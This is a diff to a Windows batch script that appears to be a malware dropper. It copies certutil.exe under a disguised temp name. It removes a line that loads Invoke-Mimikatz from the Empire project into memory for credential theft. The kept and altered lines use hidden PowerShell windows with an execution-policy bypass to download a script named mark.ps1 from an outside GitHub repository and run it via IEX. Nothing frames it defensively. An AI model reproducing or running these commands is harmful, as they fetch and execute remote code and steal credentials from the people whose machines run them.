@@ -1,8 +1,7 @@
 @echo on
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
-powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
 
-powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1','%Temp%\mark.ps1')"
+start cmd.exe powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1','%Temp%\mark.ps1')"
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
 
 
